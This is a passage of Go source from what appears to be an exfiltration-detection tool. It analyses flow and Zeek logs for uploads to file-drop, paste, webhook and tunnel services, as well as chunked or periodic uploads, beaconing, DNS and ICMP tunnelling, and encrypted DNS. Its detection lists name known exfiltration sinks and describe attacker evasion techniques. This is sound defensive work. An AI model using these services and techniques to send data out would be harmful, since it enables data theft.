	"name":  {"sni", "server_name", "host", "hostname", "domain", "url", "dst_host"},
}

// ParseFlowCSV reads a generic flow export with a recognisable header.
func (td *trafficData) ParseFlowCSV(name string, data []byte) (bool, error) {
	rd := csv.NewReader(bytes.NewReader(data))
	rd.FieldsPerRecord = -1
	rd.TrimLeadingSpace = true
	hdr, err := rd.Read()
	if err != nil {
		return false, nil
	}
	idx := map[string]int{}
	for i, h := range hdr {
		h = strings.ToLower(strings.TrimSpace(h))
		for k, aliases := range csvAliases {
			for _, a := range aliases {
				if h == a {
					if _, dup := idx[k]; !dup {
						idx[k] = i
					}
				}
			}
		}
	}
	_, hs := idx["src"]
	_, hd := idx["dst"]
	_, ho := idx["out"]
	if !hs || !hd || !ho {
		return false, nil
	}
	td.sources = append(td.sources, name)
	get := func(rec []string, k string) string {
		if i, ok := idx[k]; ok && i < len(rec) {
			return strings.TrimSpace(rec[i])
		}
		return ""
	}
	for {
		rec, err := rd.Read()
		if err == io.EOF {
			break
		}
		if err != nil {
			continue
		}
		ts := parseTime(get(rec, "ts"))
		td.seen(ts)
		dport, _ := strconv.Atoi(get(rec, "dport"))
		nm := strings.ToLower(get(rec, "name"))
		if u, err := url.Parse(nm); err == nil && u.Host != "" {
			nm = u.Hostname()
		}
		proto := strings.ToLower(get(rec, "proto"))
		if proto == "" {
			proto = "tcp"
		}
		td.sessions = append(td.sessions, session{ts: ts, end: ts, client: get(rec, "src"), server: get(rec, "dst"),
			dport: dport, proto: proto, out: atoi64(get(rec, "out")), in: atoi64(get(rec, "in")), name: nm})
	}
	return true, nil
}

// finalizeZeek attaches ssl/http names and methods to conn sessions.
func (td *trafficData) finalizeZeek() {
	for i := range td.sessions {
		s := &td.sessions[i]
		if s.uid == "" {
			continue
		}
		if n, ok := td.zeekName[s.uid]; ok && s.name == "" {
			s.name = n
		}
		if m, ok := td.zeekMethod[s.uid]; ok {
			s.method = m
		}
	}
}

// ---- detection ----

// exfilServices: destinations commonly abused as exfiltration sinks.
var exfilServices = []struct {
	suffix, label, tech string
	tiny                bool // normal use moves almost no data upstream (webhooks, pastes)
}{
	{"dropbox.com", "Dropbox", "T1567.002", false}, {"dropboxapi.com", "Dropbox API", "T1567.002", false},
	{"content.dropboxapi.com", "Dropbox upload", "T1567.002", false},
	{"mega.nz", "MEGA", "T1567.002", false}, {"mega.co.nz", "MEGA", "T1567.002", false}, {"mega.io", "MEGA", "T1567.002", false},
	{"transfer.sh", "transfer.sh", "T1567.002", false}, {"file.io", "file.io", "T1567.002", false},
	{"gofile.io", "GoFile", "T1567.002", false}, {"anonfiles.com", "AnonFiles", "T1567.002", false},
	{"wetransfer.com", "WeTransfer", "T1567.002", false}, {"sendspace.com", "SendSpace", "T1567.002", false},
	{"mediafire.com", "MediaFire", "T1567.002", false}, {"catbox.moe", "Catbox", "T1567.002", false},
	{"temp.sh", "temp.sh", "T1567.002", false}, {"oshi.at", "oshi.at", "T1567.002", false},
	{"bashupload.com", "bashupload", "T1567.002", false}, {"0x0.st", "0x0.st", "T1567.002", false},
	{"storage.googleapis.com", "Google Cloud Storage", "T1567.002", false}, {"drive.google.com", "Google Drive", "T1567.002", false},
	{"www.googleapis.com", "Google API upload", "T1567.002", false},
	{"s3.amazonaws.com", "Amazon S3", "T1567.002", false}, {"blob.core.windows.net", "Azure Blob", "T1567.002", false},
	{"onedrive.live.com", "OneDrive", "T1567.002", false}, {"1drv.ms", "OneDrive", "T1567.002", false},
	{"box.com", "Box", "T1567.002", false}, {"pcloud.com", "pCloud", "T1567.002", false},
	{"pastebin.com", "Pastebin", "T1567", true}, {"paste.ee", "paste.ee", "T1567", true}, {"ghostbin.com", "Ghostbin", "T1567", true},
	{"hastebin.com", "Hastebin", "T1567", true}, {"rentry.co", "Rentry", "T1567", true},
	{"api.telegram.org", "Telegram Bot API", "T1567", true}, {"discord.com", "Discord (webhook/API)", "T1567.004", true},
	{"discordapp.com", "Discord (webhook/API)", "T1567.004", true}, {"hooks.slack.com", "Slack webhook", "T1567.004", true},
	{"webhook.site", "webhook.site", "T1567.004", true}, {"pipedream.net", "Pipedream", "T1567.004", true},
	{"requestbin.net", "RequestBin", "T1567.004", true}, {"interact.sh", "Interactsh (OAST)", "T1567", true},
	{"oast.fun", "Interactsh (OAST)", "T1567", true}, {"burpcollaborator.net", "Burp Collaborator", "T1567", true},
	{"ngrok.io", "ngrok tunnel", "T1572", false}, {"ngrok-free.app", "ngrok tunnel", "T1572", false},
	{"trycloudflare.com", "Cloudflare quick tunnel", "T1572", false}, {"serveo.net", "serveo tunnel", "T1572", false},
	{"localhost.run", "localhost.run tunnel", "T1572", false}, {"github.com", "GitHub", "T1567.001", false},
	{"gitlab.com", "GitLab", "T1567.001", false},
}

// anonDrop: anonymous file-drop / tunnel services with no business identity.
var anonDrop = map[string]bool{"transfer.sh": true, "file.io": true, "GoFile": true, "AnonFiles": true, "0x0.st": true,
	"temp.sh": true, "oshi.at": true, "bashupload": true, "Catbox": true, "SendSpace": true, "ngrok tunnel": true,
	"Cloudflare quick tunnel": true, "serveo tunnel": true, "localhost.run tunnel": true}

func matchService(name string) (label, tech string, tiny, ok bool) {
	name = strings.ToLower(strings.TrimSuffix(name, "."))
	for _, s := range exfilServices {
		if name == s.suffix || strings.HasSuffix(name, "."+s.suffix) {
			return s.label, s.tech, s.tiny, true
		}
	}
	return "", "", false, false
}

var altProto = map[int]string{20: "FTP-data", 21: "FTP", 22: "SSH/SFTP/SCP", 69: "TFTP", 445: "SMB", 873: "rsync",
	139: "NetBIOS/SMB", 3389: "RDP", 5900: "VNC", 1194: "OpenVPN", 51820: "WireGuard", 6667: "IRC", 25: "SMTP", 587: "SMTP submission", 465: "SMTPS"}

var webPorts = map[int]bool{80: true, 443: true, 8080: true, 8443: true}

// channel aggregates every session between one client and one destination/port.
type channel struct {
	client, server string
	dport          int
	proto          string
	names          map[string]bool
	methods        map[string]int
	sessions       []session
	out, in        int64
}

func (c *channel) name() string {
	var ns []string
	for n := range c.names {
		ns = append(ns, n)
	}
	sort.Strings(ns)
	if len(ns) == 0 {
		return c.server
	}
	return strings.Join(ns, ",")
}

func humanBytes(n int64) string {
	switch {
	case n >= 1<<30:
		return fmt.Sprintf("%.2f GB", float64(n)/(1<<30))
	case n >= 1<<20:
		return fmt.Sprintf("%.1f MB", float64(n)/(1<<20))
	case n >= 1<<10:
		return fmt.Sprintf("%.1f KB", float64(n)/(1<<10))
	}
	return fmt.Sprintf("%d B", n)
}

func meanCV(v []float64) (mean, cv float64) {
	if len(v) == 0 {
		return 0, 0
	}
	for _, x := range v {
		mean += x
	}
	mean /= float64(len(v))
	if mean == 0 {
		return 0, 0
	}
	var ss float64
	for _, x := range v {
		ss += (x - mean) * (x - mean)
	}
	return mean, math.Sqrt(ss/float64(len(v))) / mean
}

// periodicity: intervals between session starts and per-session sizes.
func periodicity(ss []session) (n int, ivMean, ivCV, szMean, szCV float64) {
	sort.Slice(ss, func(i, j int) bool { return ss[i].ts.Before(ss[j].ts) })
	var iv, sz []float64
	for i, s := range ss {
		sz = append(sz, float64(s.out))
		if i > 0 && !s.ts.IsZero() && !ss[i-1].ts.IsZero() {
			iv = append(iv, s.ts.Sub(ss[i-1].ts).Seconds())
		}
	}
	ivMean, ivCV = meanCV(iv)
	szMean, szCV = meanCV(sz)
	return len(ss), ivMean, ivCV, szMean, szCV
}

func sevFor(bytes int64) string {
	switch {
	case bytes >= volHigh:
		return "high"
	case bytes >= volMed:
		return "medium"
	}
	return "low"
}

func exFinding(id, title, sev, tech, src, ev, detail, detect string) Finding {
	return Finding{RuleID: id, Title: title, Severity: sev, Score: sevWeight[sev], Tactic: "Exfiltration",
		Technique: tech, File: src, Evidence: ev, Detail: detail, Detection: detect, Fprint: fingerprint(id, ev)}
}

// TrafficSummary is shown above the findings.
type TrafficSummary struct {
	Sources        []string
	Packets        int
	Sessions       int
	DNSQueries     int
	ICMPFlows      int
	Span           time.Duration
	EgressBytes    int64
	EgressChannels int
	Stats          *TrafficStats
	chans          []*channel
}

// AnalyzeTraffic runs every exfil detector over the loaded data.
func AnalyzeTraffic(td *trafficData) ([]Finding, TrafficSummary) {
	td.finalizeZeek()
	src := strings.Join(td.sources, ",")
	sum := TrafficSummary{Sources: td.sources, Packets: td.packets, Sessions: len(td.sessions),
		DNSQueries: len(td.dns), ICMPFlows: len(td.icmp)}
	if !td.first.IsZero() {
		sum.Span = td.last.Sub(td.first)
	}
	// is there any internal host at all? if not (lab / public capture), every
	// session counts as potential egress.
	anyInternal := false
	for _, s := range td.sessions {
		if isInternal(s.client) || isInternal(s.server) {
			anyInternal = true
			break
		}
	}
	egress := func(client, server string) bool {
		if !anyInternal {
			return true
		}
		return isInternal(client) && !isInternal(server)
	}
	chans := map[string]*channel{}
	var keys []string
	for _, s := range td.sessions {
		if !egress(s.client, s.server) {
			continue
		}
		k := s.client + "|" + s.server + "|" + strconv.Itoa(s.dport) + "|" + s.proto
		c := chans[k]
		if c == nil {
			c = &channel{client: s.client, server: s.server, dport: s.dport, proto: s.proto, names: map[string]bool{}, methods: map[string]int{}}
			chans[k] = c
			keys = append(keys, k)
		}
		if s.name != "" {
			c.names[s.name] = true
		}
		if s.method != "" {
			c.methods[s.method]++
		}
		c.sessions = append(c.sessions, s)
		c.out += s.out
		c.in += s.in
		sum.EgressBytes += s.out
	}
	sort.Strings(keys)
	sum.EgressChannels = len(keys)
	var fs []Finding
	for _, k := range keys {
		c := chans[k]
		fs = append(fs, channelFindings(c, src)...)
	}
	for _, k := range keys {
		sum.chans = append(sum.chans, chans[k])
	}
	sum.Stats = buildStats(td, sum.chans)
	fs = append(fs, dnsFindings(td.dns, src)...)
	fs = append(fs, icmpFindings(td.icmp, src, egress)...)
	sortFindings(fs)
	return fs, sum
}

func channelFindings(c *channel, src string) []Finding {
	var fs []Finding
	who := fmt.Sprintf("%s → %s:%d (%s)", c.client, c.name(), c.dport, c.proto)
	ratio := float64(c.out) / math.Max(float64(c.in), 1)
	stats := fmt.Sprintf("out %s · in %s · ratio %.1f:1 · %d session(s)", humanBytes(c.out), humanBytes(c.in), ratio, len(c.sessions))
	flagged := false
	// 0. encrypted DNS (DoH / DoT / DoQ)
	doh := false
	if f, ok := dohFinding(c, src, who, stats); ok {
		fs = append(fs, f)
		flagged, doh = true, true
	}
	// 1. known exfil sinks
	for n := range c.names {
		label, tech, tiny, ok := matchService(n)
		if !ok {
			continue
		}
		min := int64(1 << 20)
		if tiny {
			min = 64 << 10
		}
		if c.out < min {
			continue
		}
		sev := sevFor(c.out)
		if sev == "low" {
			sev = "medium"
		}
		if tiny && c.out >= 1<<20 || anonDrop[label] && c.out >= volMed {
			sev = "high"
		}
		fs = append(fs, exFinding("EXF-CLOUD", "Upload to "+label, sev, tech, src, who, stats+
			". "+label+" is a common exfiltration sink; verify the transfer was sanctioned.",
			"Alert on uploads to file-sharing / paste / webhook / tunnel services from servers and non-browser processes."))
		flagged = true
		break
	}
	// 2. alternative protocols to the Internet
	if p, ok := altProto[c.dport]; ok && c.out >= 1<<20 && ratio >= 2 {
		sev := sevFor(c.out)
		if sev == "low" {
			sev = "medium"
		}
		fs = append(fs, exFinding("EXF-ALTPROTO", "Bulk upload over "+p, sev, "T1048", src, who,
			stats+". Data leaving over a non-web protocol to an external host.",
			"Restrict outbound "+p+" to approved destinations; alert on large egress."))
		flagged = true
	}
	// 3. raw volume / upload-heavy
	if !flagged && c.out >= volMed && ratio >= 3 {
		tech := "T1041"
		if !webPorts[c.dport] {
			tech = "T1048"
		}
		fs = append(fs, exFinding("EXF-VOLUME", "Large upload to a single external host", sevFor(c.out), tech, src, who,
			stats+".", "Baseline per-host egress; alert when one destination receives an outsized share."))
		flagged = true
	}
	// 4. periodic chunked transfer (T1030 size limits / T1029 scheduled)
	n, ivMean, ivCV, szMean, szCV := periodicity(append([]session(nil), c.sessions...))
	chunked := n >= 8 && ivMean > 0 && ivCV <= 0.35 && szCV <= 0.35 && c.out >= 256<<10 && szMean >= 4096
	if chunked {
		sev := "medium"
		if c.out >= volMed {
			sev = "high"
		}
		fs = append(fs, exFinding("EXF-CHUNKED", "Periodic fixed-size uploads", sev, "T1030", src, who,
			fmt.Sprintf("%d uploads of ~%s every ~%.0fs (interval CV %.2f, size CV %.2f); total %s.",
				n, humanBytes(int64(szMean)), ivMean, ivCV, szCV, humanBytes(c.out)),
			"Chunked uploads at a fixed cadence evade per-flow volume limits — aggregate per destination over hours."))
	}
	// 4b. steady low-volume check-ins (C2 beaconing / trickle exfil)
	if !chunked {
		if f, ok := beaconFinding(c, src, who); ok {
			fs = append(fs, f)
		}
	}
	// 5. HTTP POST/PUT to a bare IP
	if c.methods["POST"]+c.methods["PUT"] > 0 && c.out >= 1<<20 {
		for n := range c.names {
			h := n
			if hh, _, err := net.SplitHostPort(n); err == nil {
				h = hh
			}
			if net.ParseIP(h) != nil {
				fs = append(fs, exFinding("EXF-HTTP-IP", "HTTP upload to a raw IP address", "medium", "T1041", src, who,
					stats+fmt.Sprintf(". %d POST/PUT request(s) with no DNS name.", c.methods["POST"]+c.methods["PUT"]),
					"Legitimate services are reached by name; block or alert on uploads to bare IPs."))
				break
			}
		}
	}
	// 6. TLS without SNI carrying data
	if !doh && c.dport == 443 && c.proto == "tcp" && len(c.names) == 0 && c.out >= 5<<20 && ratio >= 3 {
		fs = append(fs, exFinding("EXF-NOSNI", "Encrypted upload without SNI", "low", "T1573", src, who,
			stats+". No TLS server name was seen (custom TLS, ESNI/ECH or non-TLS on 443).",
			"Inspect port-443 sessions whose ClientHello lacks SNI."))
	}
	return fs
}

var secondLevels = map[string]bool{"co": true, "com": true, "net": true, "org": true, "gov": true, "ac": true,
	"edu": true, "or": true, "ne": true, "go": true, "mil": true, "nom": true, "ltd": true, "plc": true, "sch": true}

func baseDomain(name string) (string, string) {
	l := strings.Split(name, ".")
	n := 2
	if len(l) >= 3 && len(l[len(l)-1]) == 2 && secondLevels[l[len(l)-2]] {
		n = 3
	}
	if len(l) <= n {
		return name, ""
	}
	return strings.Join(l[len(l)-n:], "."), strings.Join(l[:len(l)-n], ".")
}

var benignEncoded = []string{"in-addr.arpa", "ip6.arpa", "arpa", "spamhaus.org", "spamcop.net", "surbl.org", "uribl.com",
	"sorbs.net", "barracudacentral.org", "dnswl.org", "mailspike.net", "sophosxl.net", "mcafee.com", "trendmicro.com",
	"senderbase.org", "cymru.com", "akamaiedge.net", "akamai.net", "cloudfront.net", "amazonaws.com",
	"googlevideo.com", "1e100.net", "gvt1.com", "msedge.net", "trafficmanager.net", "azureedge.net", "fastly.net",
	"edgekey.net", "apple-dns.net", "icloud.com", "local", "lan"}

func isBenignEncoded(base string) bool {
	for _, b := range benignEncoded {
		if base == b || strings.HasSuffix(base, "."+b) {
			return true
		}
	}
	return false
}

// decodeRatio estimates raw bytes per encoded character from the alphabet.
func decodeRatio(s string) float64 {
	hex, b32 := true, true
	for _, c := range strings.ToLower(s) {
		if !(c >= '0' && c <= '9' || c >= 'a' && c <= 'f') {
			hex = false
		}
		if !(c >= 'a' && c <= 'z' || c >= '2' && c <= '7') {
			b32 = false
		}
	}
	switch {
	case hex:
		return 0.5
	case b32:
		return 0.625
	}
	return 0.75
}

type dnsProfile struct {
	client, base string
	queries      int
	uniq         map[string]bool
	subChars     int
	txt          int
	concat       strings.Builder
	first, last  time.Time
}

// dnsFindings looks for data encoded into query names (T1048.003).
func dnsFindings(qs []dnsQ, src string) []Finding {
	profs := map[string]*dnsProfile{}
	var keys []string
	for _, q := range qs {
		base, sub := baseDomain(q.qname)
		if sub == "" {
			continue
		}
		k := q.client + "|" + base
		p := profs[k]
		if p == nil {
			p = &dnsProfile{client: q.client, base: base, uniq: map[string]bool{}, first: q.ts}
			profs[k] = p
			keys = append(keys, k)
		}
		p.queries++
		p.last = q.ts
		if q.qtype == 16 || q.qtype == 10 {
			p.txt++
		}
		if !p.uniq[sub] {
			p.uniq[sub] = true
			flat := strings.ReplaceAll(sub, ".", "")
			p.subChars += len(flat)
			if p.concat.Len() < 1<<16 {
				p.concat.WriteString(flat)
			}
		}
	}
	sort.Strings(keys)
	var fs []Finding
	for _, k := range keys {
		p := profs[k]
		u := len(p.uniq)
		if u < 20 {
			continue
		}
		mean := float64(p.subChars) / float64(u)
		ent := shannonEntropy([]byte(p.concat.String()))
		if mean < 18 || ent < 3.5 {
			continue
		}
		est := int64(float64(p.subChars) * decodeRatio(p.concat.String()))
		sev := "medium"
		if est >= 10<<10 || u >= 300 {
			sev = "high"
		}
		if est >= volMed {
			sev = "critical"
		}
		title := "Data encoded in DNS query names"
		if isBenignEncoded(p.base) {
			sev, title = "info", title+" (known benign lookup service)"
		}
		rate := ""
		if d := p.last.Sub(p.first); d > 0 {
			rate = fmt.Sprintf(" over %s (%.1f q/min)", d.Round(time.Second), float64(p.queries)/d.Minutes())
		}
		fs = append(fs, exFinding("EXF-DNS", title, sev, "T1048.003", src,
			fmt.Sprintf("%s → *.%s", p.client, p.base),
			fmt.Sprintf("%d queries, %d unique subdomains, mean %.0f chars, entropy %.2f, TXT/NULL %d%s; ≈%s encoded.",
				p.queries, u, mean, ent, p.txt, rate, humanBytes(est)),
			"Alert on many unique long high-entropy subdomains under one domain; sinkhole the domain."))
	}
	return fs
}

// icmpFindings flags echo requests that carry data instead of ping filler.
func icmpFindings(m map[string]*icmpStat, src string, egress func(a, b string) bool) []Finding {
	var keys []string
	for k := range m {
		keys = append(keys, k)
	}
	sort.Strings(keys)
	var fs []Finding
	for _, k := range keys {
		st := m[k]
		if !egress(st.src, st.dst) {
			continue
		}
		who := fmt.Sprintf("%s → %s (ICMP echo)", st.src, st.dst)
		if !st.payloadKnown { // flow logs: volume only
			if st.bytes >= 64<<10 {
				sev := sevFor(st.bytes)
				if sev == "low" {
					sev = "medium"
				}
				fs = append(fs, exFinding("EXF-ICMP", "High-volume ICMP echo traffic", sev, "T1048", src, who,
					fmt.Sprintf("%d echo requests carrying %s (avg %d B).", st.count, humanBytes(st.bytes), int(st.bytes)/max(st.count, 1)),
					"Normal ping moves a few KB; cap ICMP payload size at the egress firewall."))
			}
			continue
		}
		nonStd := float64(st.nonStd) / float64(st.count)
		distinct := float64(len(st.distinct)) / float64(st.count)
		ent := shannonEntropy(st.sample)
		if st.bytes < 4<<10 || nonStd < 0.5 || (distinct < 0.5 && ent < 6) {
			continue
		}
		sev := "medium"
		if st.bytes >= 1<<20 {
			sev = "high"
		}
		fs = append(fs, exFinding("EXF-ICMP", "Data carried in ICMP echo payloads", sev, "T1048", src, who,
			fmt.Sprintf("%d echo requests, %s payload, max %d B, %.0f%% non-standard, %.0f%% distinct, entropy %.2f.",
				st.count, humanBytes(st.bytes), st.maxLen, nonStd*100, distinct*100, ent),
			"Stock ping payloads are fixed patterns; distinct high-entropy payloads indicate a covert channel."))
	}
	return fs
}

// LoadInput detects the input type (capture, Zeek, flow CSV) and parses it.
// ok=false means it is plain text for the indicator scanner.
func (td *trafficData) LoadInput(path string) (bool, error) {
	data, err := os.ReadFile(path)
	if err != nil {
		return false, err
	}
	name := filepath.Base(path)
	if isCapture(data) {
		return true, td.ParseCapture(name, data)
	}
	text := string(data)
	if isZeek(text) {
		return true, td.ParseZeek(name, text)
	}
	if ok, err := td.ParseFlowCSV(name, data); ok || err != nil {
		return ok, err
	}
	return false, nil
}

// ====================================================================
//  BEACONING + ENCRYPTED DNS (DoH / DoT / DoQ)
// ====================================================================

// beaconBenign: vendor update / telemetry hosts that poll on a fixed timer.
// A beacon to them is reported LOW, not ignored — attackers front C2 too.
var beaconBenign = []string{"windowsupdate.com", "microsoft.com", "msftconnecttest.com", "office.com", "live.com",
	"apple.com", "icloud.com", "googleapis.com", "gstatic.com", "google.com", "mozilla.org", "mozilla.net",
	"ubuntu.com", "canonical.com", "debian.org", "github.com", "slack.com", "zoom.us", "dropbox.com", "spotify.com"}

func hasSuffixIn(name string, list []string) bool {
	name = strings.ToLower(strings.TrimSuffix(name, "."))
	for _, s := range list {
		if name == s || strings.HasSuffix(name, "."+s) {
			return true
		}
	}
	return false
}

// beaconStats measures how regular the session starts are. frac is the share
// of intervals within ±20% of the median (robust to the odd missed / extra
// check-in, unlike a plain coefficient of variation).
func beaconStats(ss []session) (n int, median, jitter, frac float64) {
	var ts []time.Time
	for _, s := range ss {
		if !s.ts.IsZero() {
			ts = append(ts, s.ts)
		}
	}
	sort.Slice(ts, func(i, j int) bool { return ts[i].Before(ts[j]) })
	var iv []float64
	for i := 1; i < len(ts); i++ {
		iv = append(iv, ts[i].Sub(ts[i-1]).Seconds())
	}
	if len(iv) < 2 {
		return len(ts), 0, 0, 0
	}
	sorted := append([]float64(nil), iv...)
	sort.Float64s(sorted)
	median = sorted[len(sorted)/2]
	if median <= 0 {
		return len(ts), 0, 0, 0
	}
	in := 0
	var dev []float64
	for _, x := range iv {
		d := math.Abs(x - median)
		dev = append(dev, d)
		if d <= 0.2*median {
			in++
		}
	}
	sort.Float64s(dev)
	return len(ts), median, dev[len(dev)/2] / median, float64(in) / float64(len(iv))
}

func humanDur(sec float64) string {
	d := time.Duration(sec * float64(time.Second))
	if sec < 10 {
		return d.Round(100 * time.Millisecond).String()
	}
	return d.Round(time.Second).String()
}

// beaconFinding: many small sessions on a steady cadence (C2 check-ins,
// scheduled trickle exfil). Bulk transfers are left to the volume rules.
func beaconFinding(c *channel, src, who string) (Finding, bool) {
	if c.dport == 123 || c.dport == 53 || len(c.sessions) < 10 {
		return Finding{}, false
	}
	n, med, jit, frac := beaconStats(c.sessions)
	if n < 10 || med < 1 || med > 86400 || frac < 0.7 {
		return Finding{}, false
	}
	avgOut, avgIn := c.out/int64(len(c.sessions)), c.in/int64(len(c.sessions))
	if avgOut > 16<<10 || avgIn > 32<<10 { // check-ins are small; bulk moves are other rules' job
		return Finding{}, false
	}
	sev, note := "medium", ""
	tiny := false
	for nm := range c.names {
		if label, _, t, ok := matchService(nm); ok && (t || anonDrop[label]) {
			tiny = true
		}
	}
	switch {
	case len(c.names) > 0 && func() bool {
		for nm := range c.names {
			if !hasSuffixIn(nm, beaconBenign) {
				return false
			}
		}
		return true
	}():
		sev, note = "low", " Destination is a known vendor update / telemetry host."
	case frac >= 0.85 && n >= 20 && (len(c.names) == 0 || !webPorts[c.dport] || tiny):
		sev = "high"
	}
	return exFinding("EXF-BEACON", "Periodic beaconing", sev, "T1029", src, who,
		fmt.Sprintf("%d connections every ~%s (jitter ±%.0f%%, %.0f%% on cadence); avg %s out / %s in per session over %s.%s",
			n, humanDur(med), jit*100, frac*100, humanBytes(avgOut), humanBytes(avgIn),
			humanDur(c.sessions[len(c.sessions)-1].ts.Sub(c.sessions[0].ts).Seconds()), note),
		"Score connection regularity per host pair over hours (RITA-style); check the owning process of steady low-volume check-ins."), true
}

// dohNames: public DNS-over-HTTPS / TLS resolver endpoints (suffix match).
var dohNames = []string{"dns.google", "dns.google.com", "cloudflare-dns.com", "one.one.one.one", "dns.quad9.net",
	"dns9.quad9.net", "dns10.quad9.net", "dns11.quad9.net", "doh.opendns.com", "doh.familyshield.opendns.com",
	"nextdns.io", "doh.cleanbrowsing.org", "dns.adguard.com", "dns.adguard-dns.com", "doh.mullvad.net", "dns.mullvad.net",
	"dns.alidns.com", "doh.pub", "doh.dns.sb", "dns0.eu", "controld.com", "doh.libredns.gr", "dns.switch.ch",
	"doh.applied-privacy.net", "ordns.he.net", "doh.xfinity.com", "dns.twnic.tw", "doh.360.cn"}

// dohIPs: anycast resolver addresses, used when no SNI was seen.
var dohIPs = map[string]bool{"8.8.8.8": true, "8.8.4.4": true, "1.1.1.1": true, "1.0.0.1": true, "9.9.9.9": true,
	"149.112.112.112": true, "208.67.222.222": true, "208.67.220.220": true, "94.140.14.14": true, "94.140.15.15": true,
	"185.228.168.168": true, "185.228.169.168": true, "76.76.2.0": true, "45.90.28.0": true, "45.90.30.0": true,
	"2606:4700:4700::1111": true, "2606:4700:4700::1001": true, "2001:4860:4860::8888": true,
	"2001:4860:4860::8844": true, "2620:fe::fe": true, "2620:fe::9": true}

// dohFinding: encrypted DNS sidesteps the resolver logs every DNS-tunnel
// detector relies on. Browsers do it legitimately (LOW); upstream volume
// that DNS lookups never need points at tunnelling (godoh, dnscat2 over DoH).
func dohFinding(c *channel, src, who, stats string) (Finding, bool) {
	kind := ""
	switch {
	case c.dport == 853 && c.proto == "tcp":
		kind = "DNS-over-TLS"
	case c.dport == 853 && c.proto == "udp":
		kind = "DNS-over-QUIC"
	case c.dport == 443 || c.dport == 8443:
		for nm := range c.names {
			if hasSuffixIn(nm, dohNames) {
				kind = "DNS-over-HTTPS (" + nm + ")"
			}
		}
		if kind == "" && len(c.names) == 0 && dohIPs[c.server] {
			kind = "DNS-over-HTTPS (resolver IP " + c.server + ", no SNI)"
		}
	}
	if kind == "" {
		return Finding{}, false
	}
	sev := "low"
	switch {
	case c.out >= 1<<20 && c.out >= c.in:
		sev = "high"
	case c.out >= 256<<10:
		sev = "medium"
	}
	return exFinding("EXF-DOH", "Encrypted DNS: "+kind, sev, "T1572", src, who,
		stats+". Encrypted DNS bypasses the internal resolver, so DNS logging and tunnel detection never see these lookups"+
			map[bool]string{true: "; upstream volume this large is far beyond normal lookups.", false: "."}[sev == "high"],
		"Force DNS through the internal resolver: block 853/tcp+udp and known DoH endpoints, or use the canary domain use-application-dns.net."), true
}

// ====================================================================
//  TOP TALKERS + EGRESS TIMELINE
// ====================================================================

var (
	topN         = 10
	timelineBins = 48
	sparkRunes   = []rune("▁▂▃▄▅▆▇█")
)

type hostStat struct {
	Host     string  `json:"host"`
	Out      int64   `json:"bytes_out"`
	In       int64   `json:"bytes_in"`
	Peers    int     `json:"peers"`
	Sessions int     `json:"sessions"`
	Timeline []int64 `json:"timeline,omitempty"`
	peers    map[string]bool
}

// TrafficStats is the exportable traffic overview (JSON "traffic" key).
type TrafficStats struct {
	EgressBytes int64      `json:"egress_bytes"`
	Start       string     `json:"start,omitempty"`
	End         string     `json:"end,omitempty"`
	BinSeconds  float64    `json:"bin_seconds,omitempty"`
	Timeline    []int64    `json:"timeline,omitempty"`
	PeakAt      string     `json:"peak_at,omitempty"`
	PeakBytes   int64      `json:"peak_bytes,omitempty"`
	TopSources  []hostStat `json:"top_sources"`
	TopDests    []hostStat `json:"top_destinations"`
}

func destLabel(c *channel) string {
	n := c.name()
	if c.dport != 443 && c.dport != 80 || n == c.server {
		n += ":" + strconv.Itoa(c.dport)
	}
	return n
}

// buildStats aggregates egress per source host and per destination and
// spreads each session's bytes evenly over its lifetime into timeline bins.
func buildStats(td *trafficData, chans []*channel) *TrafficStats {
	st := &TrafficStats{TopSources: []hostStat{}, TopDests: []hostStat{}}
	span := td.last.Sub(td.first)
	bins := 0
	var width time.Duration
	if !td.first.IsZero() && span > 0 {
		bins = timelineBins
		width = span / time.Duration(bins)
		if width < time.Second {
			width = time.Second
			bins = int(span/width) + 1
		}
		st.Timeline = make([]int64, bins)
		st.BinSeconds = width.Seconds()
		st.Start, st.End = td.first.UTC().Format(time.RFC3339), td.last.UTC().Format(time.RFC3339)
	}
	idx := func(t time.Time) int {
		return max(0, min(bins-1, int(t.Sub(td.first)/width)))
	}
	spread := func(arr []int64, s session) {
		if bins == 0 || s.ts.IsZero() || s.out == 0 {
			return
		}
		end := s.end
		if end.Before(s.ts) {
			end = s.ts
		}
		a, b := idx(s.ts), idx(end)
		per := s.out / int64(b-a+1)
		for i := a; i <= b; i++ {
			arr[i] += per
		}
		arr[b] += s.out - per*int64(b-a+1)
	}
	srcs, dsts := map[string]*hostStat{}, map[string]*hostStat{}
	get := func(m map[string]*hostStat, k string) *hostStat {
		h := m[k]
		if h == nil {
			h = &hostStat{Host: k, peers: map[string]bool{}}
			if bins > 0 {
				h.Timeline = make([]int64, bins)
			}
			m[k] = h
		}
		return h
	}
	for _, c := range chans {
		dl := destLabel(c)
		s, d := get(srcs, c.client), get(dsts, dl)
		s.Out, s.In, s.Sessions = s.Out+c.out, s.In+c.in, s.Sessions+len(c.sessions)
		d.Out, d.In, d.Sessions = d.Out+c.out, d.In+c.in, d.Sessions+len(c.sessions)
		s.peers[dl], d.peers[c.client] = true, true
		st.EgressBytes += c.out
		for _, ss := range c.sessions {
			spread(st.Timeline, ss)
			spread(s.Timeline, ss)
			spread(d.Timeline, ss)
		}
	}
	rank := func(m map[string]*hostStat) []hostStat {
		var out []hostStat
		for _, h := range m {
			h.Peers = len(h.peers)
			out = append(out, *h)
		}
		sort.Slice(out, func(i, j int) bool {
			if out[i].Out != out[j].Out {
				return out[i].Out > out[j].Out
			}
			return out[i].Host < out[j].Host
		})
		if topN > 0 && len(out) > topN {
			out = out[:topN]
		}
		if out == nil {
			out = []hostStat{}
		}
		return out
	}
	st.TopSources, st.TopDests = rank(srcs), rank(dsts)
	for i, v := range st.Timeline {
		if v > st.PeakBytes {
			st.PeakBytes = v
			st.PeakAt = td.first.Add(time.Duration(i) * width).UTC().Format(time.RFC3339)
		}
	}
	return st
}

// sparkline draws zero bins as blanks so quiet periods (and beacon gaps)
// stay visible; resample folds the series to at most w cells.
func sparkline(v []int64, w int) string {
	if len(v) == 0 {
		return ""
	}
	if w > 0 && len(v) > w {
		f := make([]int64, w)
		for i, x := range v {
			f[i*w/len(v)] += x
		}
		v = f
	}
	var mx int64
	for _, x := range v {
		mx = max(mx, x)
	}
	var b strings.Builder
	for _, x := range v {
		switch {
		case x == 0 || mx == 0:
			b.WriteRune(' ')
		default:
			b.WriteRune(sparkRunes[min(len(sparkRunes)-1, int(float64(x)/float64(mx)*float64(len(sparkRunes)-1)+0.5))])
		}
	}
	return b.String()
}

func printStats(st *TrafficStats) {
	if st == nil {
		return
	}
